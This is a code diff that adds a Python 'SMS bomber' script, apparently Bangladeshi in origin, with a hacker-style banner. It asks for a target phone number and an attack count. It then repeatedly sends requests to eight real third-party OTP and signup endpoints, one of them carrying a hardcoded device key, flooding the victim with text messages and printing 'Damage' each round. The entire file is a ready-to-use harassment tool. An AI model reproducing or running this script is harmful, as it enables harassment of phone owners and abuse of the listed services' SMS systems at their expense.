@@ -1,0 +1,128 @@
+import requests
+from requests.structures import CaseInsensitiveDict
+
+green = '\033[1;32m'
+end = '\033[0m'
+print (green+"""  _______ _    _ _  _____                                         
+ |__   __| |  | (_)/ ____|                                        
+    | |  | |__| |_| (___                                          
+    | |  |  __  | |\___ \                                         
+    | |  | |  | | |____) |                                        
+   _|_|_ |_|  |_|_|_____/____   __  __                            
+  / ____|      / ____|__   __| |  \/  |                           
+ | (___  _   _| (___    | | ___| \  / |                           
+  \___ \| | | |\___ \   | |/ _ \ |\/| |                           
+  ____) | |_| |____) |  | |  __/ |  | |                           
+ |_____/ \__, |_____/___|_|\___|_|  |_|                           
+  / ____| __/ |     |__   __|                                     
+ | |     |___/___  __ _| | ___  _ __                              
+ | |    | '__/ _ \/ _` | |/ _ \| '__|                             
+ | |____| | |  __/ (_| | | (_) | |                                
+  \_____|_|  \___|\__,_|_|\___/|_|                                
+ |  _ \                                                           
+ | |_) |_   _                                                     
+ |  _ <| | | |                                                    
+ | |_) | |_| |                                                    
+ |____/ \__, |                                                    
+         __/ |                                                    
+   __  _|___/ _____         _____ _    _       _  ___ ____   __   
+  / / | |  | |  __ \       / ____| |  | |     | |/ (_)  _ \  \ \  
+ | |  | |__| | |  | |_____| (___ | |__| | __ _| ' / _| |_) |  | | 
+ | |  |  __  | |  | |______\___ \|  __  |/ _` |  < | |  _ <   | | 
+ | |  | |  | | |__| |      ____) | |  | | (_| | . \| | |_) |  | | 
+ | |  |_|  |_|_____/      |_____/|_|  |_|\__,_|_|\_\_|____/   | | 
+  \_\                                                        /_/  
+                                                                  """+end)
+
+# CVALUE
+blue = '\33[94m'
+lightblue = '\033[94m'
+red = '\033[91m'
+white = '\33[97m'
+yellow = '\33[93m'
+green = '\033[1;32m'
+cyan = "\033[96m"
+end = '\033[0m'
+print ("\033[32m")
+
+print ("	 -!-!- WeLcOmE-!-!- ( HD-SHaKiiB ) ( GhOsToFKiinG ) ")
+
+number  = str(input("[>] Heii Mr : SHaKiiB Sir. apNar aTTack NumBer DiN: "))
+
+sms  = str(input("[>] Heii Mr : SHaKiiB Sir. apNar aTTack ar ReaSON TypE kOrUN: "))
+
+message=str(input('[>] Enter Your Target SmaLL Message:'))
+
+
+amount = int(input("[>] Sir apNar aTTack ar PoriMaN LikHuN: "))
+ 
+
+
+url1 = "http://128.199.215.102/api/otpresend"
+
+headers1 = CaseInsensitiveDict()
+headers1["Content-Type"] = "application/x-www-form-urlencoded"
+
+data1 = "phone="+number
+
+url2 = "http://oncapp.xyz/app/v1/user/user_auth.php?otp_send="+sms+"&mobile="+number
+
+url3 = "https://bddp.bimamobile.com/android/mobile/2.0/auth/otp"
+
+headers3 = CaseInsensitiveDict()
+headers3["Content-Type"] = "application/json"
+
+data3 = """{
+\"additionData\":{\"mobile_version\":11,\"app_hash\":\"1BWKWKPGXiJ\",\"msisdn\":\""""+number+"""\",\"country_id\":1},\"requestId\":\"7777\"
+}"""
+
+url4 = "https://gw.jotno.net/auth/login/token"
+
+headers4 = CaseInsensitiveDict()
+headers4["Content-Type"] = "application/json"
+
+data4 = """{\"username\":\""""+number+"""\",\"userType\":\"CONSUMER\"}"""
+
+url5 = "https://addabaji.mobi/twocups-v1-robi/otp.php"
+
+headers5 = CaseInsensitiveDict()
+headers5["Content-Type"] = "application/x-www-form-urlencoded"
+
+data5 = "msisdn="+number
+
+url6 = "http://13.250.248.255/ami_probashi_api_v6/api/v3/bn/registration/send_otp?api_test=true&device_type=1&device_key=fBxnlOZCTY-WRWXOSheo4w%3AAPA91bFtpzsXyJlrH1QtPJWeic5xdKBw6x46MfK1h7rvUuE7RI8HJlgoPjK5KkuMr6XAcwuvIr9eM9f6SY7b5kBl2VnZnKPXQ4U3YJfqAo7QyUJjSZ9jW_b27AxJEEaTsVoknTebNLls&username=%2B88"+number+"&confirmation=create_new_account"
+
+url7 = "https://halkhata.io/p/api/with-otp/send/signup"
+
+headers7 = CaseInsensitiveDict()
+headers7["Content-Type"] = "application/json"
+
+data7 = """{\"phoneNum\":\""""+number+"""\",\"hash\":[\""""+message+"""\"]}"""
+
+url8 = "https://api.meenaclick.com/api/front/sms/send/pin?'"
+
+headers8 = CaseInsensitiveDict()
+headers8["Content-Type"] = "application/x-www-form-urlencoded"
+
+data8 = "cell_phone="+number
+
+for i in range(amount):
+	
+	resp1 = requests.post(url1, headers=headers1, data=data1)
+
+	resp2 = requests.get(url2)
+	
+	resp3 = requests.post(url3, headers=headers3, data=data3)
+	
+	resp4 = requests.post(url4, headers=headers4, data=data4)
+	
+	resp5 = requests.post(url5, headers=headers5, data=data5)
+	
+	resp6 = requests.post(url6)
+	
+	resp7 = requests.post(url7, headers=headers7, data=data7)
+	
+	resp8 = requests.post(url8, headers=headers8, data=data8)
+
+	print(str (i+1)+" Damage \n")
+
